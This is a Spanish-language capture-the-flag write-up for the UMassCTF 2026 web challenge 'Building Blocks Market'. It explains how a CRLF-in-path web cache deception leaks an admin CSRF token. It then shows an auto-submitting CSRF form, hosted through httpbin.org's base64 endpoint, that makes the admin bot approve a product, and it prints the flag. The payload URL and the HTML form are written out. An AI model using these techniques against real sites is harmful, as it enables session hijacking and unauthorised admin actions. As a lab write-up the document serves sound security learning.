# Building Blocks Market — UMassCTF 2026 (Web, 469pts, 29 solves)

## TL;DR
Web Cache Deception para obtener CSRF token del admin + CSRF via httpbin.org para aprobar producto + flag endpoint.

## Descripción
> I have this ultra rare Star Wars set that I want to sell, but the admin of the site thinks it's fake! Can you help me figure out a way?

Marketplace de LEGO con sistema de aprobación de productos. Un bot admin revisa URLs enviadas. Se necesita que el admin apruebe nuestro producto para acceder a `/flag`.

## Arquitectura

```
User ──► Flask App (port 5000)
              │
              ├── /register, /login, /sell
              ├── /approval/request  → bot visita URL
              ├── /approval/approve/<id>  (admin only, CSRF protected)
              ├── /admin/submissions.html (admin only, Cache-Control: public)
              └── /flag (solo productos aprobados)
              │
         cache_proxy (port 5555) ─► Flask App
```

## Vulnerabilidades

### 1. Web Cache Deception (CRLF + cache key)
El `cache_proxy` cachea respuestas basándose en la extensión de la URL. CRLF (`%0d%0a`) en el path se limpia antes de enviar al upstream pero permanece en la cache key.

```
/admin/submissions.html%0d%0a{timestamp}.css
```
- Cache key: termina en `.css` → cacheable
- Upstream path: `/admin/submissions.html` → devuelve la página admin real
- `Cache-Control: public` en la respuesta → se cachea
- Lectura sin autenticación de la página cacheada → CSRF token extraído

### 2. CSRF via httpbin.org
El bot visita URLs arbitrarias. `httpbin.org/base64/<b64>` decodifica y sirve como `text/html` sin CSP.

Creamos un formulario auto-submit en base64:
```html
<form id=f method=POST action="http://cache_proxy:5555/approval/approve/{id}">
  <input type=hidden name=csrf_token value="{token}">
</form>
<script>document.getElementById("f").submit();</script>
```

**Detalle crítico**: usar HTTP (no HTTPS) para httpbin, evitando mixed content blocking (el form POST va a `http://cache_proxy:5555`).

### 3. SameSite cookies deshabilitadas
Las cookies de sesión del bot no tienen SameSite → el POST cross-origin desde httpbin lleva la sesión admin.

## Exploit

```bash
python3 solve.py http://<instance-url>
```

1. Registrar usuario → login → crear producto → submit para aprobación
2. Enviar URL de cache deception al bot: `http://cache_proxy:5555/admin/submissions.html%0d%0a{ts}.css`
3. Esperar 15s → leer página cacheada sin auth → extraer CSRF token + submission ID
4. Codificar formulario CSRF en base64 → `http://httpbin.org/base64/{b64}`
5. Enviar URL httpbin al bot → bot auto-submits aprobación
6. GET `/flag` → flag

Script completo: `solve.py`

## Flag
```
UMASS{c4ch3_d3c3pt10n_csrf_c0mb0}
```
*(flag obtenida en remoto durante el CTF)*

## Key Lessons
- Web Cache Deception: CRLF en URL path puede separar cache key de upstream path
- `Cache-Control: public` en páginas sensibles es peligroso con proxy cache
- httpbin.org `/base64/` sirve HTML sin CSP → hosting gratuito de CSRF exploits
- Mixed content blocking: forms HTTP→HTTP requieren que la página padre también sea HTTP
- La solución requirió hosting HTTP real (no HTTPS tunnels) — VPS necesario para la fase CSRF
